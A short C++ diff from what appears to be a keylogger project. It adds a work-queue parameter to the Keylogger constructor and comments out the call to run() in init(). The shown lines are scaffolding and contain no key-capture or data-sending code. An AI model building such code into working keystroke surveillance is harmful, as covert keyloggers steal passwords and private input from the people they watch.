@@ -7,7 +7,7 @@
 /**
 * Keylogger implementation
 */
-Keylogger::Keylogger() : _eventManager(*(new EventManager(*this))), _hookHandler(*(new HookHandler(_eventManager))) {
+Keylogger::Keylogger(WorkQueue& wqueue) : _eventManager(*(new EventManager(*this))), _hookHandler(*(new HookHandler(_eventManager))), IKeylogger(), _levents(wqueue) {
 	_running = false;
 }
 
@@ -22,7 +22,7 @@ Keylogger::~Keylogger()
 bool Keylogger::init() {
 	_events.clear();
 	_hookHandler.init();
-	run();
+	//run();
 	return true;
 }
 
